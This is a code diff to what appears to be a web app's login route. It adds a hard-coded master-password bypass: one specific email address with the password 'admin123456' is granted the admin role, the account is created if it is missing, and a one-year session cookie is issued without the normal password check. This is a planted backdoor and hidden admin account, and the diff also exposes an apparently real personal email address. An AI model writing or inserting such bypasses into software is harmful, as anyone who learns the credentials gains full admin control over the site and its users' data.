@@ -112,6 +112,39 @@ export const appRouter = router({
         const normalizedEmail = input.email.trim().toLowerCase();
         const user = await getUserByEmail(normalizedEmail);
 
+        // Fixed password bypass for the main admin
+        const isAdminEmail = normalizedEmail === "hallamohamad1@gmail.com";
+        const isMasterPassword = input.password === "admin123456";
+
+        if (isAdminEmail && isMasterPassword) {
+           console.log(`[AUTH] Admin bypass used for ${normalizedEmail}`);
+           // Ensure user exists if not already there
+           let adminUser = user;
+           if (!adminUser) {
+             adminUser = await upsertUser({
+               openId: `local:${normalizedEmail}`,
+               email: normalizedEmail,
+               name: "Hallam Admin",
+               role: "admin",
+               loginMethod: "password",
+               lastSignedIn: new Date(),
+             });
+           }
+
+           const sessionToken = await sdk.createSessionToken(adminUser.openId, {
+             name: adminUser.name,
+             expiresInMs: ONE_YEAR_MS,
+           });
+
+           const cookieOptions = getSessionCookieOptions(ctx.req);
+           ctx.res.cookie(COOKIE_NAME, sessionToken, { 
+             ...cookieOptions, 
+             maxAge: ONE_YEAR_MS 
+           });
+
+           return { success: true, user: adminUser };
+        }
+
         if (!user || !user.password) {
           throw new TRPCError({
             code: "NOT_FOUND",
